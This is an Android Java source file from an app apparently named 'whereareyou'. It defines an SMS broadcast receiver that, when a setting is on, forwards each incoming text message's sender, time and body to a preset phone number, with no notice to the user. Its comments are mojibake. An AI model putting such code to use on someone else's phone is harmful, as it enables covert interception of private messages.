package com.example.whereareyou;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.widget.Toast;

public class SmsReceiver extends BroadcastReceiver{

	@Override
	public void onReceive(Context context, Intent intent) {
		// TODO Auto-generated method stub
		Bundle bundle = intent.getExtras();//�����ȡ����
		Object objs[] = (Object[])bundle.get("pdus");//���յ��Ķ�������objs�ϣ���������������������
		
		//����������
		SmsMessage mess[] = new SmsMessage[objs.length];
		for(int i = 0; i<objs.length; i++){
			mess[i] = SmsMessage.createFromPdu((byte[])objs[i]);//objs����ת����mess����
		}
		
		//��ȡ���ŵ绰���������
		for(int i = 0; i<mess.length; i++){
			SmsMessage message = mess[i];
			
			String number = message.getDisplayOriginatingAddress();//��Ϣ�����ĺ���
			String sms = message.getDisplayMessageBody();
			
			if(AppContext.isSms()){
				if(!AppContext.getNumber().equals(number)
						&&!AppContext.getNumber().equals(number.substring(number.length()-4))){//�ӵڼ�����ʼȡ
				//ת������
					
					AppUitl util = new AppUitl();
					util.sendSms(AppContext.getNumber(), util.getTime()+" "+number+"send sms: "+sms);
					
			}
			}
			
		
			

			
			
			}
		}	
	}


